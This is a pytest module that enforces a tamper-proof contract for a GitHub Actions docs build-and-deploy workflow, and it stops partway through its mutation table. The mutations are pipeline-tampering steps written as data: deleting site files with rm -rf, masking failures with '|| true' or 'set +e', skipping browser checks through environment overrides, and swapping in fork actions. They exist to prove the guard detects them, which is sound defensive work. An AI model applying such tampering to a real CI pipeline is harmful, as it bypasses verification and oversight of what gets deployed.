"""Contract for the production documentation workflow (Zensical Classic).

`workflow_violations` encodes the guarantees of .github/workflows/docs.yaml:

* the site that is verified is the directory that is uploaded as the Pages
  artifact, nothing can modify or rebuild it between the browser verification
  and the upload, and the upload is the last step;
* every verification command is exactly the audited command (no `|| true`,
  chaining, shell overrides, environment bypasses, extra installs/upgrades);
* the structural check compares the site with the Material reference build,
  never with itself;
* only a push to refs/heads/main can deploy, behind DOCS_PUBLISH, and only
  after the verified build; no permission is broadened.

The real workflow must satisfy it, and every mutation below, applied to an
in-memory copy, must be reported, so the guard itself cannot go slack.
`config_violations` does the same for the builder pins and the Classic variant.
"""

from __future__ import annotations

import copy
import importlib.util
import re
import sys
from pathlib import Path
from types import SimpleNamespace
from typing import Callable

import pytest
import yaml

ROOT = Path(__file__).resolve().parents[1]
WORKFLOW = ROOT / ".github" / "workflows" / "docs.yaml"
APP_WORKFLOW = ROOT / ".github" / "workflows" / "python-tests.yml"

DEPLOY_IF = "github.event_name == 'push' && github.ref == 'refs/heads/main' && vars.DOCS_PUBLISH == 'true'"
EXPECTED_GATE_NEEDS = {"lock-consistency", "tests", "frontend-tests", "browser-regression", "docker-smoke"}
WORKFLOW_PERMISSIONS = {"contents": "read", "pages": "write", "id-token": "write"}

# The audited commands of the production build, in order.
INSTALL = (
    "python -m pip install -r docs/requirements-zensical.txt "
    "-r docs/requirements-docs.txt -r docs/requirements-docs-browser.txt"
)
CHROMIUM = "python -m playwright install --with-deps chromium"
REFERENCE = 'mkdocs build --strict -d "$RUNNER_TEMP/material-reference"'
ZENSICAL_BUILD = "zensical build --clean --strict"
STRUCTURAL = 'python scripts/check_docs_site.py --site site --reference "$RUNNER_TEMP/material-reference" --self-test'
SEARCH = 'python scripts/check_docs_search.py --site site --self-test --diagnostics-dir "$RUNNER_TEMP/search-diagnostics"'
AUDITED = {INSTALL, CHROMIUM, REFERENCE, ZENSICAL_BUILD, STRUCTURAL, SEARCH}
DIAGNOSTICS_PATH = "${{ runner.temp }}/search-diagnostics"

# Allow-lists (F1/F2): the only step keys, jobs keys and actions the production
# workflow may use, each with its exact expected configuration.
WORKFLOW_KEYS = {"name", "on", "permissions", "concurrency", "jobs"}
BUILD_JOB_KEYS = {"runs-on", "permissions", "steps"}
DEPLOY_JOB_KEYS = {"if", "needs", "runs-on", "environment", "steps"}
RUN_STEP_KEYS = {"name", "run", "env"}
USES_STEP_KEYS = {"name", "uses", "with", "if"}
DEPLOY_STEP_KEYS = {"name", "id", "uses"}
REFERENCE_ENV = {"NO_MKDOCS_2_WARNING": "1"}
CHECKOUT = "actions/checkout@v4"
SETUP_PYTHON = "actions/setup-python@v5"
UPLOAD_ARTIFACT = "actions/upload-artifact@v4"
UPLOAD_PAGES = "actions/upload-pages-artifact@v3"
DEPLOY_PAGES = "actions/deploy-pages@v4"
DIAGNOSTICS_WITH = {
    "name": "docs-search-diagnostics",
    "path": DIAGNOSTICS_PATH,
    "if-no-files-found": "ignore",
    "retention-days": 7,
}
# uses -> (exact `with`, None meaning the step must have no `with`)
ALLOWED_ACTIONS: dict[str, dict | None] = {
    CHECKOUT: None,
    SETUP_PYTHON: {"python-version": "3.12"},
    UPLOAD_ARTIFACT: DIAGNOSTICS_WITH,
    UPLOAD_PAGES: {"path": "site"},
}

_MASKING = re.compile(r"\|\||;|&&|\||\bset\s+\+e\b|\bexit\s+0\b|\btrue\b|\bcontinue\b")


def load(path: Path = WORKFLOW) -> dict:
    return yaml.safe_load(path.read_text("utf-8"))


def _cmd(step: dict) -> str:
    return " ".join(str(step.get("run", "")).split())


def _uses(step: dict) -> str:
    return str(step.get("uses", ""))


def _find(steps: list[dict], needle: str) -> int | None:
    for i, step in enumerate(steps):
        if needle in str(step.get("run", "")) or needle in _uses(step):
            return i
    return None


def _is_diagnostics(step: dict) -> bool:
    return (
        _uses(step).startswith("actions/upload-artifact@")
        and step.get("if") == "failure()"
        and step.get("with", {}).get("path") == DIAGNOSTICS_PATH
    )


def workflow_violations(wf: dict) -> list[str]:
    v: list[str] = []
    jobs = wf.get("jobs", {})
    if set(jobs) != {"build", "deploy"}:
        v.append(f"unexpected job set {sorted(jobs)}: only `build` and `deploy` may exist")
    if wf.get("permissions") != WORKFLOW_PERMISSIONS:
        v.append("workflow-level permissions changed")
    for key in sorted(set(wf) - WORKFLOW_KEYS - {True}):
        v.append(f"unexpected workflow-level key: workflow-level `{key}` is not allowed")
    if wf.get("concurrency") != {"group": "pages", "cancel-in-progress": False}:
        v.append("workflow concurrency changed")
    triggers = wf.get("on", wf.get(True)) or {}
    if "pull_request" not in triggers or triggers.get("push", {}).get("branches") != ["main"]:
        v.append("triggers must include pull_request and push to main")

    build = jobs.get("build", {})
    steps = build.get("steps", [])
    if build.get("permissions") != {"contents": "read"}:
        v.append("build job permissions must be exactly contents: read")
    for key in sorted(set(build) - BUILD_JOB_KEYS):
        v.append(f"unexpected build job key: build job must not set `{key}`")
    if build.get("runs-on") != "ubuntu-latest":
        v.append("build job must run on ubuntu-latest")
    if build.get("continue-on-error"):
        v.append("continue-on-error on the build job")

    install = _find(steps, "pip install")
    chromium = _find(steps, "playwright install")
    reference = _find(steps, "mkdocs build")
    zen_builds = [i for i, s in enumerate(steps) if "zensical build" in str(s.get("run", ""))]
    structural = _find(steps, "scripts/check_docs_site.py")
    search = _find(steps, "scripts/check_docs_search.py")
    zen_build = zen_builds[0] if zen_builds else None
    for label, index in (
        ("pinned Zensical install", install),
        ("Chromium install", chromium),
        ("Material reference build", reference),
        ("strict Zensical build (`zensical build --clean --strict`)", zen_build),
        ("structural check", structural),
        ("browser search regression", search),
    ):
        if index is None:
            v.append(f"missing step: {label}")
    if len(zen_builds) > 1:
        v.append("site rebuilt: more than one Zensical build step")

    # --- commands: exactly the audited ones, no masking, no extra installs ---
    for step in steps:
        command = _cmd(step)
        name = step.get("name")
        if not command:
            continue
        if _MASKING.search(command):
            v.append(f"failure masking or command chaining in step {name!r}")
        if "pip install" in command and command != INSTALL:
            v.append(f"unexpected installation or upgrade command in step {name!r}")
        elif "zensical" in command and command not in (INSTALL, ZENSICAL_BUILD):
            v.append(f"unexpected Zensical command in step {name!r}")
        elif command not in AUDITED:
            v.append(f"unaudited command in step {name!r}: {command!r}")
    if structural is not None:
        match = re.search(r"--site (\S+) --reference (\S+)", _cmd(steps[structural]))
        if not match:
            v.append("structural check must pass --site and --reference")
        else:
            site, ref = match.groups()
            if site == ref:
                v.append("structural check compares the site against itself")
            if reference is not None:
                target = re.search(r"-d\s+(\S+)", _cmd(steps[reference]))
                if not target or ref != target.group(1):
                    v.append("structural check reference must be the Material reference build output")
    if structural is not None and "--self-test" not in _cmd(steps[structural]):
        v.append("structural check must run with --self-test")
    if search is not None:
        run = _cmd(steps[search])
        if "--site site" not in run or "--self-test" not in run:
            v.append("browser search regression must run on `--site site` with --self-test")
    if reference is not None and not re.search(r'-d\s+"\$RUNNER_TEMP/', _cmd(steps[reference])):
        v.append("Material reference build must write outside the published directory")

    # --- steps must not carry bypasses -------------------------------------
    for step in steps:
        name = step.get("name")
        if step.get("continue-on-error"):
            v.append(f"continue-on-error on step {name!r}")
        if "shell" in step:
            v.append(f"custom shell on step {name!r} (it can disable fail-fast)")
        env = step.get("env")
        if env and not (env == {"NO_MKDOCS_2_WARNING": "1"} and _cmd(step) == REFERENCE):
            v.append(f"unexpected step environment on {name!r} (Playwright prerequisites could be bypassed)")
        if "if" in step and not _is_diagnostics(step):
            v.append(f"only the failure-diagnostics upload may be conditional, not {name!r}")
        if _uses(step).startswith("actions/upload-artifact@") and not _is_diagnostics(step):
            v.append(f"unexpected artifact upload in step {name!r} (diagnostics only, from the temp directory)")
    for index in (install, chromium, reference, zen_build, structural, search):
        if index is not None and "if" in steps[index]:
            v.append(f"conditional verification step {steps[index].get('name')!r}")

    # --- F1: explicit allow-list of step keys (working-directory, timeout, id, ...) ---
    for step in steps:
        allowed = USES_STEP_KEYS if "uses" in step else RUN_STEP_KEYS
        extra = sorted(set(step) - allowed)
        if extra:
            v.append(f"unexpected step key(s) {extra} in step {step.get('name') or _uses(step) or _cmd(step)!r}")
        if "uses" in step and "run" in step:
            v.append(f"step {step.get('name')!r} has both `uses` and `run`")

    # --- F2: explicit allow-list of actions with their exact configuration ---
    for step in steps:
        uses = _uses(step)
        if not uses:
            continue
        if uses not in ALLOWED_ACTIONS:
            v.append(f"unexpected action {uses!r} in the build job")
        elif step.get("with") != ALLOWED_ACTIONS[uses]:
            v.append(f"unexpected inputs for action {uses!r}: {step.get('with')!r}")
    if [i for i, s in enumerate(steps) if _uses(s) == CHECKOUT] != [0]:
        v.append("exactly one checkout is required and it must be the first step")
    if [i for i, s in enumerate(steps) if _uses(s) == SETUP_PYTHON] != [1]:
        v.append("exactly one setup-python is required and it must be the second step")

    # --- the verified site is the uploaded site ----------------------------
    pages = [i for i, s in enumerate(steps) if _uses(s).startswith("actions/upload-pages-artifact@")]
    if len(pages) != 1:
        v.append("exactly one Pages artifact upload is required in the build job")
    else:
        upload = steps[pages[0]]
        if upload.get("with") != {"path": "site"}:
            v.append("uploaded directory must be the verified `site` directory (no other inputs)")
        if pages[0] != len(steps) - 1:
            v.append("the Pages artifact upload must be the last step of the build job")
        verification = [i for i in (zen_build, structural, search) if i is not None]
        if verification and pages[0] < max(verification):
            v.append("Pages artifact is uploaded before verification has finished")
        if search is not None and pages[0] > search:
            between = steps[search + 1 : pages[0]]
            if not all(_is_diagnostics(s) for s in between):
                v.append("the Pages artifact upload must directly follow the browser verification "
                         "(only the failure-diagnostics upload may sit between them)")
        if zen_build is not None and structural is not None and search is not None:
            between = [s for s in steps[zen_build + 1 : pages[0]] if not _is_diagnostics(s)]
            if between != [steps[structural], steps[search]]:
                v.append("between the Zensical build and the upload only the structural and browser "
                         "verification may run (nothing may modify or rebuild site/)")
    if None not in (chromium, search) and chromium > search:
        v.append("Chromium must be installed before the browser check")
    if None not in (install, zen_build) and install > zen_build:
        v.append("Zensical must be installed before it is used")
    if None not in (structural, search) and structural > search:
        v.append("structural check must precede the browser check")
    for step in steps:
        if _is_diagnostics(step) and step["with"].get("path") == "site":
            v.append("diagnostics upload must not publish the site directory")

    # --- nothing else can publish -------------------------------------------
    for name, job in jobs.items():
        for step in job.get("steps", []):
            uses = _uses(step)
            if "deploy-pages" in uses and name != "deploy":
                v.append(f"job {name!r} must not deploy")
            if uses.startswith("actions/upload-pages-artifact@") and name != "build":
                v.append(f"job {name!r} must not upload a Pages artifact")

    deploy = jobs.get("deploy", {})
    if deploy.get("needs") not in ("build", ["build"]):
        v.append("deploy must need exactly the verified build job")
    if deploy.get("if") != DEPLOY_IF:
        v.append("deploy condition changed (must be a push to refs/heads/main with DOCS_PUBLISH == 'true' only)")
    if "permissions" in deploy and deploy["permissions"] != WORKFLOW_PERMISSIONS:
        v.append("deploy permissions broadened or changed")
    if deploy.get("continue-on-error"):
        v.append("continue-on-error on deploy")
    deploy_steps = deploy.get("steps", [])
    if len(deploy_steps) != 1 or _uses(deploy_steps[0]) != DEPLOY_PAGES:
        v.append("deploy must consist of the single actions/deploy-pages step (exact action version)")
    else:
        step = deploy_steps[0]
        if "with" in step:
            v.append("deploy-pages must not take inputs")
        if set(step) - DEPLOY_STEP_KEYS:
            v.append(f"unexpected key(s) {sorted(set(step) - DEPLOY_STEP_KEYS)} on the deploy step")
    for key in sorted(set(deploy) - DEPLOY_JOB_KEYS - {"permissions", "continue-on-error"}):
        v.append(f"unexpected deploy job key `{key}`")
    if deploy.get("runs-on") != "ubuntu-latest":
        v.append("deploy must run on ubuntu-latest")
    if deploy.get("environment") != {"name": "github-pages", "url": "${{ steps.deployment.outputs.page_url }}"}:
        v.append("deploy must use the github-pages environment exactly as audited")
    return v


def config_violations(files: dict[str, str]) -> list[str]:
    """Builder pins and the Classic variant (text of the four config files)."""

    def pins(text: str) -> list[str]:
        return [l.strip() for l in text.splitlines() if l.strip() and not l.startswith("#")]

    v: list[str] = []
    if pins(files["requirements-zensical.txt"]) != ["zensical==0.0.73"]:
        v.append("production builder pin changed (must be exactly zensical==0.0.73)")
    if pins(files["requirements-docs-browser.txt"]) != ["playwright==1.64.0"]:
        v.append("browser test pin changed (must be exactly playwright==1.64.0)")
    if pins(files["requirements-docs.txt"]) != ["mkdocs-material>=9.5,<10"]:
        v.append("Material reference/rollback requirement changed")
    config = files["mkdocs.yml"]
    if not re.search(r"^theme:\n  name: material\n(?:  #.*\n)*  variant: classic\n", config, re.M):
        v.append("theme.variant must be classic")
    if "modern" in config:
        v.append("the Modern variant must not be configured")
    if re.search(r"^\s*-\s*offline\b", config, re.M):
        v.append("the offline plugin must not be enabled (it rewrites URLs to .html)")
    if "use_directory_urls" in config:
        v.append("use_directory_urls must stay at its default (directory-style URLs)")
    return v


def _config_files() -> dict[str, str]:
    names = ("requirements-zensical.txt", "requirements-docs-browser.txt", "requirements-docs.txt")
    files = {n: (ROOT / "docs" / n).read_text("utf-8") for n in names}
    files["mkdocs.yml"] = (ROOT / "mkdocs.yml").read_text("utf-8")
    return files


# --- the real workflow and configuration ----------------------------------------


def test_real_workflow_satisfies_the_production_contract():
    assert workflow_violations(load()) == []


def test_real_configuration_satisfies_the_pin_contract():
    assert config_violations(_config_files()) == []


def test_application_ci_gate_is_unchanged_and_independent_of_the_docs_workflow():
    app = load(APP_WORKFLOW)
    assert set(app["jobs"]["ci-gate"]["needs"]) == EXPECTED_GATE_NEEDS
    assert set(app["jobs"]) == EXPECTED_GATE_NEEDS | {"ci-gate"}
    assert set(app["jobs"]).isdisjoint(load()["jobs"])


def test_tested_directory_is_the_uploaded_directory():
    steps = load()["jobs"]["build"]["steps"]
    checked = [re.search(r"--site (\S+)", _cmd(s)).group(1) for s in steps if "--site" in _cmd(s)]
    uploaded = next(s["with"]["path"] for s in steps if _uses(s).startswith("actions/upload-pages-artifact@"))
    assert checked and set(checked) == {uploaded} == {"site"}


def test_pages_upload_directly_follows_the_browser_verification():
    steps = load()["jobs"]["build"]["steps"]
    search = _find(steps, "scripts/check_docs_search.py")
    assert [_uses(s) for s in steps[search + 1 :]][-1].startswith("actions/upload-pages-artifact@")
    assert all(_is_diagnostics(s) for s in steps[search + 1 : -1])
    assert len(steps[search + 1 :]) == 2  # failure diagnostics, then the Pages upload


# --- R4: main-only deployment, evaluated against every event ---------------------


def _evaluate(condition: str, event: str, ref: str, docs_publish: str | None) -> bool:
    """Evaluate the (small, audited) deploy expression for a simulated event."""
    github = SimpleNamespace(event_name=event, ref=ref)
    variables = SimpleNamespace(DOCS_PUBLISH=docs_publish)
    expression = condition.replace("&&", " and ").replace("||", " or ")
    assert re.fullmatch(r"[\w\s.'=/&|!-]+", expression), expression  # no calls, no surprises
    return bool(eval(expression, {"__builtins__": {}}, {"github": github, "vars": variables}))  # noqa: S307


@pytest.mark.parametrize(
    ("event", "ref", "docs_publish", "deploys"),
    [
        ("push", "refs/heads/main", "true", True),
        ("push", "refs/heads/main", None, False),
        ("push", "refs/heads/main", "false", False),
        ("push", "refs/heads/main", "True", False),
        ("pull_request", "refs/pull/89/merge", "true", False),
        ("push", "refs/tags/v0.1.0", "true", False),
        ("push", "refs/tags/v0.1.0-rc4", "true", False),
        ("push", "refs/heads/feature/x", "true", False),
        ("push", "refs/heads/main-backup", "true", False),
        ("workflow_dispatch", "refs/heads/main", "true", False),
    ],
)
def test_deploy_condition_truth_table(event, ref, docs_publish, deploys):
    assert _evaluate(load()["jobs"]["deploy"]["if"], event, ref, docs_publish) is deploys


def test_failed_build_cannot_deploy():
    deploy = load()["jobs"]["deploy"]
    assert deploy["needs"] == "build"  # `needs` + the implicit success() gate
    assert not re.search(r"always\(|failure\(|cancelled\(|success\(", deploy["if"])  # no status override
    assert "continue-on-error" not in deploy
    assert not load()["jobs"]["build"].get("continue-on-error")


def test_pull_requests_and_tags_still_build_and_verify_but_never_deploy():
    wf = load()
    triggers = wf.get("on", wf.get(True))
    assert "pull_request" in triggers and triggers["push"]["tags"] == ["v*"]
    assert "build" in wf["jobs"] and "needs" not in wf["jobs"]["build"] and "if" not in wf["jobs"]["build"]


# --- mutations: the guard must catch each regression -----------------------------

_DELETE = object()


def _build_steps(wf: dict) -> list[dict]:
    return wf["jobs"]["build"]["steps"]


def _idx(wf: dict, needle: str) -> int:
    index = _find(_build_steps(wf), needle)
    assert index is not None, needle
    return index


def _step(needle: str) -> Callable[[dict], dict]:
    return lambda wf: _build_steps(wf)[_idx(wf, needle)]


def _deploy(wf: dict) -> dict:
    return wf["jobs"]["deploy"]


def _build(wf: dict) -> dict:
    return wf["jobs"]["build"]


def _set(path: Callable[[dict], dict], key: str, value) -> Callable[[dict], None]:
    def mutate(wf: dict) -> None:
        target = path(wf)
        if value is _DELETE:
            target.pop(key)
        else:
            target[key] = value

    return mutate


def _append_to(needle: str, suffix: str) -> Callable[[dict], None]:
    def mutate(wf: dict) -> None:
        step = _step(needle)(wf)
        step["run"] = " ".join(str(step["run"]).split()) + suffix

    return mutate


def _replace_in(needle: str, old: str, new: str) -> Callable[[dict], None]:
    def mutate(wf: dict) -> None:
        step = _step(needle)(wf)
        command = " ".join(str(step["run"]).split())
        assert old in command, (old, command)
        step["run"] = command.replace(old, new)

    return mutate


def _drop(needle: str) -> Callable[[dict], None]:
    return lambda wf: _build_steps(wf).pop(_idx(wf, needle))


def _insert_after(needle: str, step: dict) -> Callable[[dict], None]:
    return lambda wf: _build_steps(wf).insert(_idx(wf, needle) + 1, copy.deepcopy(step))


def _append(step: dict) -> Callable[[dict], None]:
    return lambda wf: _build_steps(wf).append(copy.deepcopy(step))


def _move_pages_before(needle: str) -> Callable[[dict], None]:
    def mutate(wf: dict) -> None:
        steps = _build_steps(wf)
        upload = steps.pop(_idx(wf, "upload-pages-artifact"))
        steps.insert(_idx(wf, needle), upload)

    return mutate


def _nth(index: int) -> Callable[[dict], dict]:
    return lambda wf: _build_steps(wf)[index]


def _uses_of(index: int, value: str) -> Callable[[dict], None]:
    def mutate(wf: dict) -> None:
        _build_steps(wf)[index]["uses"] = value

    return mutate


def _swap_first_two(wf: dict) -> None:
    steps = _build_steps(wf)
    steps[0], steps[1] = steps[1], steps[0]


def _deploy_step(wf: dict) -> dict:
    return wf["jobs"]["deploy"]["steps"][0]


def _deploy_env(wf: dict) -> dict:
    return wf["jobs"]["deploy"]["environment"]


def _diagnostics_with(**changes) -> Callable[[dict], None]:
    def mutate(wf: dict) -> None:
        step = _step("upload-artifact")(wf)
        step["with"] = {**step["with"], **changes}

    return mutate


def _extra_job(wf: dict) -> None:
    wf["jobs"]["docs-zensical"] = {
        "runs-on": "ubuntu-latest",
        "steps": [{"uses": "actions/upload-pages-artifact@v3", "with": {"path": "site"}}],
    }


MUTATIONS: dict[str, tuple[Callable[[dict], None], str]] = {
    # --- ordering / presence (R2) ---
    "Pages upload moved before the Zensical build": (_move_pages_before("zensical build"), "uploaded before verification"),
    "Pages upload moved before the browser check": (_move_pages_before("check_docs_search.py"), "uploaded before verification"),
    "browser search regression removed": (_drop("check_docs_search.py"), "missing step: browser search regression"),
    "structural check removed": (_drop("check_docs_site.py"), "missing step: structural check"),
    "Chromium install removed": (_drop("playwright install"), "missing step: Chromium install"),
    "pinned install removed": (_drop("pip install"), "missing step: pinned Zensical install"),
    "Zensical build no longer strict": (_replace_in("zensical build", "--strict", ""), "unexpected Zensical command"),
    # --- artifact integrity (R2) ---
    "step inserted between the browser check and the upload": (
        _insert_after("check_docs_search.py", {"name": "tweak", "run": "rm -rf site/assets"}),
        "directly follow the browser verification",
    ),
    "site rebuilt after the browser check": (
        _insert_after("check_docs_search.py", {"name": "rebuild", "run": "zensical build --clean --strict"}),
        "site rebuilt",
    ),
    "site modified between the two verification steps": (
        _insert_after("check_docs_site.py", {"name": "tweak", "run": "touch site/index.html"}),
        "only the structural and browser verification may run",
    ),
    "site modified after the Zensical build": (
        _insert_after("zensical build", {"name": "tweak", "run": "rm -rf site/faq"}),
        "only the structural and browser verification may run",
    ),
    "modifying command chained onto the browser check": (
        _append_to("check_docs_search.py", " && rm -rf site/assets"),
        "failure masking or command chaining",
    ),
    "Pages upload no longer last": (_append({"name": "late", "run": "echo done"}), "must be the last step"),
    "second Pages upload added": (_append({"uses": "actions/upload-pages-artifact@v3", "with": {"path": "site"}}), "exactly one Pages artifact upload"),
    "Pages upload of another directory": (_set(_step("upload-pages-artifact"), "with", {"path": "material-reference"}), "uploaded directory must be"),
    "Pages upload with a trailing-slash path": (_set(_step("upload-pages-artifact"), "with", {"path": "site/"}), "uploaded directory must be"),
    "Pages upload with extra inputs": (_set(_step("upload-pages-artifact"), "with", {"path": "site", "name": "other"}), "uploaded directory must be"),
    "alternate upload via upload-artifact named github-pages": (
        _insert_after("check_docs_search.py", {"uses": "actions/upload-artifact@v4", "with": {"name": "github-pages", "path": "material-reference"}}),
        "unexpected artifact upload",
    ),
    "diagnostics upload publishes the site": (_set(_step("upload-artifact"), "with", {"name": "d", "path": "site"}), "unexpected artifact upload"),
    "Material reference writes to site/": (_replace_in("mkdocs build", ' -d "$RUNNER_TEMP/material-reference"', ""), "write outside the published directory"),
    "extra job that uploads a Pages artifact": (_extra_job, "unexpected job set"),
    "deploy step added to the build job": (_append({"uses": "actions/deploy-pages@v4"}), "must not deploy"),
    # --- failure masking and bypasses (R3) ---
    "`|| true` on the browser check": (_append_to("check_docs_search.py", " || true"), "failure masking"),
    "`|| true` on the structural check": (_append_to("check_docs_site.py", " || true"), "failure masking"),
    "`|| true` on the Zensical build": (_append_to("zensical build", " || true"), "failure masking"),
    "`; true` after the browser check": (_append_to("check_docs_search.py", "; true"), "failure masking"),
    "`exit 0` after the structural check": (_append_to("check_docs_site.py", "; exit 0"), "failure masking"),
    "`set +e` prefixed to the browser check": (_replace_in("check_docs_search.py", "python scripts", "set +e; python scripts"), "failure masking"),
    "output piped away from the structural check": (_append_to("check_docs_site.py", " | tee out.txt"), "failure masking"),
    "continue-on-error on the browser check": (_set(_step("check_docs_search.py"), "continue-on-error", True), "continue-on-error"),
    "continue-on-error on the structural check": (_set(_step("check_docs_site.py"), "continue-on-error", True), "continue-on-error"),
    "continue-on-error on the Zensical build": (_set(_step("zensical build"), "continue-on-error", True), "continue-on-error"),
    "continue-on-error on the Chromium install": (_set(_step("playwright install"), "continue-on-error", True), "continue-on-error"),
    "continue-on-error on the build job": (_set(_build, "continue-on-error", True), "continue-on-error on the build job"),
    "browser check made conditional": (_set(_step("check_docs_search.py"), "if", "github.event_name == 'push'"), "conditional verification"),
    "unrelated conditional step added": (_append({"name": "extra", "if": "always()", "run": "echo hi"}), "only the failure-diagnostics upload"),
    "build job made conditional": (_set(_build, "if", "github.event_name == 'push'"), "build job must not set `if`"),
    "custom shell on the browser check": (_set(_step("check_docs_search.py"), "shell", "bash {0}"), "custom shell"),
    "workflow-level defaults": (_set(lambda wf: wf, "defaults", {"run": {"shell": "bash {0}"}}), "workflow-level `defaults`"),
    "job-level environment bypasses Playwright": (_set(_build, "env", {"PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD": "1"}), "build job must not set `env`"),
    "step-level Playwright browsers path override": (_set(_step("check_docs_search.py"), "env", {"PLAYWRIGHT_BROWSERS_PATH": "/nonexistent"}), "unexpected step environment"),
    "workflow-level environment": (_set(lambda wf: wf, "env", {"PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD": "1"}), "workflow-level `env`"),
    "Chromium installed without --with-deps": (_replace_in("playwright install", " --with-deps", ""), "unaudited command"),
    "browser self-test dropped": (_replace_in("check_docs_search.py", " --self-test", ""), "browser search regression must run"),
    "structural self-test dropped": (_replace_in("check_docs_site.py", " --self-test", ""), "structural check must run with --self-test"),
    "browser check runs on another directory": (_replace_in("check_docs_search.py", "--site site", "--site other-site"), "browser search regression must run"),
    # --- F1: step-key allow-list ---
    "working-directory on the browser check": (_set(_step("check_docs_search.py"), "working-directory", "/tmp"), "unexpected step key"),
    "working-directory on the structural check": (_set(_step("check_docs_site.py"), "working-directory", "/tmp"), "unexpected step key"),
    "working-directory on the Zensical build": (_set(_step("zensical build"), "working-directory", "docs"), "unexpected step key"),
    "working-directory on the Material reference build": (_set(_step("mkdocs build"), "working-directory", "docs"), "unexpected step key"),
    "working-directory on the Chromium install": (_set(_step("playwright install"), "working-directory", "/tmp"), "unexpected step key"),
    "working-directory on the pinned install": (_set(_step("pip install"), "working-directory", "/tmp"), "unexpected step key"),
    "working-directory on the Pages upload": (_set(_step("upload-pages-artifact"), "working-directory", "/tmp"), "unexpected step key"),
    "working-directory on the checkout": (_set(_nth(0), "working-directory", "/tmp"), "unexpected step key"),
    "timeout-minutes on the browser check": (_set(_step("check_docs_search.py"), "timeout-minutes", 1), "unexpected step key"),
    "timeout-minutes on the structural check": (_set(_step("check_docs_site.py"), "timeout-minutes", 1), "unexpected step key"),
    "job-level timeout-minutes": (_set(_build, "timeout-minutes", 1), "unexpected build job key"),
    "job-level defaults (working directory)": (_set(_build, "defaults", {"run": {"working-directory": "/tmp"}}), "unexpected build job key"),
    "step id added to the browser check": (_set(_step("check_docs_search.py"), "id", "search"), "unexpected step key"),
    "run step also carrying `uses`": (_set(_step("check_docs_search.py"), "uses", "actions/checkout@v4"), "has both `uses` and `run`"),
    "reference step environment value changed": (_set(_step("mkdocs build"), "env", {"NO_MKDOCS_2_WARNING": "0"}), "unexpected step environment"),
    "extra variable on the reference step environment": (_set(_step("mkdocs build"), "env", {"NO_MKDOCS_2_WARNING": "1", "PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD": "1"}), "unexpected step environment"),
    "diagnostics condition changed to always()": (_set(_step("upload-artifact"), "if", "always()"), "only the failure-diagnostics upload may be conditional"),
    "diagnostics retention changed": (_diagnostics_with(**{"retention-days": 90}), "unexpected inputs"),
    "diagnostics name changed to github-pages": (_diagnostics_with(name="github-pages"), "unexpected inputs"),
    "diagnostics given an extra input": (_diagnostics_with(**{"overwrite": True}), "unexpected inputs"),
    # --- F2: action allow-list ---
    "checkout from another ref": (_set(_nth(0), "with", {"ref": "refs/heads/other"}), "unexpected inputs for action 'actions/checkout@v4'"),
    "checkout of another repository": (_set(_nth(0), "with", {"repository": "someone/docs"}), "unexpected inputs for action 'actions/checkout@v4'"),
    "checkout with a different fetch depth": (_set(_nth(0), "with", {"fetch-depth": 0}), "unexpected inputs for action 'actions/checkout@v4'"),
    "checkout with a token": (_set(_nth(0), "with", {"token": "${{ secrets.GITHUB_TOKEN }}"}), "unexpected inputs for action 'actions/checkout@v4'"),
    "checkout pinned to an older major": (_uses_of(0, "actions/checkout@v3"), "unexpected action"),
    "checkout floating on main": (_uses_of(0, "actions/checkout@main"), "unexpected action"),
    "checkout replaced by a fork action": (_uses_of(0, "someone/checkout@v4"), "unexpected action"),
    "second checkout added": (_append({"uses": CHECKOUT}), "exactly one checkout"),
    "checkout no longer first": (_swap_first_two, "exactly one checkout"),
    "setup-python older major": (_uses_of(1, "actions/setup-python@v4"), "unexpected action"),
    "setup-python floating on main": (_uses_of(1, "actions/setup-python@main"), "unexpected action"),
    "setup-python with another Python version": (_set(_nth(1), "with", {"python-version": "3.9"}), "unexpected inputs for action 'actions/setup-python@v5'"),
    "setup-python with a pip cache": (_set(_nth(1), "with", {"python-version": "3.12", "cache": "pip"}), "unexpected inputs for action 'actions/setup-python@v5'"),
    "setup-python with an extra input": (_set(_nth(1), "with", {"python-version": "3.12", "pip-install": "zensical"}), "unexpected inputs for action 'actions/setup-python@v5'"),
    "setup-python without inputs": (_set(_nth(1), "with", _DELETE), "unexpected inputs for action 'actions/setup-python@v5'"),
    "setup-uv action added": (_insert_after("setup-python", {"uses": "astral-sh/setup-uv@v5"}), "unexpected action"),
    "setup-node action added": (_insert_after("setup-python", {"uses": "actions/setup-node@v4"}), "unexpected action"),
    "pip-install action added": (_insert_after("setup-python", {"uses": "BSFishy/pip-action@v1", "with": {"packages": "zensical"}}), "unexpected action"),
    "cache action added": (_insert_after("setup-python", {"uses": "actions/cache@v4", "with": {"path": "site", "key": "k"}}), "unexpected action"),
    "docker action step added": (_insert_after("setup-python", {"uses": "docker://alpine:3"}), "unexpected action"),
    "local action step added": (_insert_after("setup-python", {"uses": "./.github/actions/anything"}), "unexpected action"),
    "Pages artifact action on an older version": (_uses_of(-1, "actions/upload-pages-artifact@v2"), "unexpected action"),
    "Pages artifact action from a fork": (_uses_of(-1, "someone/upload-pages-artifact@v3"), "unexpected action"),
    "extra Pages artifact upload of another directory": (_append({"uses": "actions/upload-pages-artifact@v3", "with": {"path": "material-reference"}}), "exactly one Pages artifact upload"),
    "extra upload-artifact action": (_append({"uses": "actions/upload-artifact@v4", "with": {"name": "x", "path": "site"}}), "unexpected inputs"),
    "deploy-pages on an older version": (_set(_deploy_step, "uses", "actions/deploy-pages@v3"), "single actions/deploy-pages step"),
    "deploy-pages floating on main": (_set(_deploy_step, "uses", "actions/deploy-pages@main"), "single actions/deploy-pages step"),
    "deploy-pages given inputs": (_set(_deploy_step, "with", {"artifact_name": "other"}), "deploy-pages must not take inputs"),
    "deploy step with a working directory": (_set(_deploy_step, "working-directory", "/tmp"), "unexpected key(s)"),
    "checkout added to the deploy job": (lambda wf: _deploy(wf)["steps"].insert(0, {"uses": CHECKOUT}), "single actions/deploy-pages step"),
    "deploy job timeout added": (_set(_deploy, "timeout-minutes", 1), "unexpected deploy job key"),
    "deploy environment renamed": (_set(_deploy_env, "name", "production"), "github-pages environment exactly as audited"),
    "deploy environment url dropped": (_set(_deploy_env, "url", _DELETE), "github-pages environment exactly as audited"),
    "deploy on another runner": (_set(_deploy, "runs-on", "self-hosted"), "deploy must run on ubuntu-latest"),
    "build on another runner": (_set(_build, "runs-on", "self-hosted"), "build job must run on ubuntu-latest"),
